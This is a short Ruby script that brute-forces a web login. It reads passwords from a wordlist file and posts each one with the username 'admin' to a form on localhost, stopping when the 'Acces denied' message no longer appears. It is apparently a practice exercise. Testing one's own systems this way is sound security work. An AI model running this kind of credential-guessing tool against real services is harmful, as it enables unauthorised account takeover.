require 'net/http'
require 'uri'

def wrong_pass? password
	uri = URI.parse 'http://localhost:4567'
	response = Net::HTTP.post_form(uri, :login => "admin", :password => password).body
	response.include? "Acces denied"
end





input = File.open "Password.txt", "r" 
	
while (line = input.gets)
		line.strip!
		print "password: ...#{line}..."
		if wrong_pass? line
			puts "Error"
			
		else
			puts "It's OK"
			
			input.close
			exit
		end
		
end
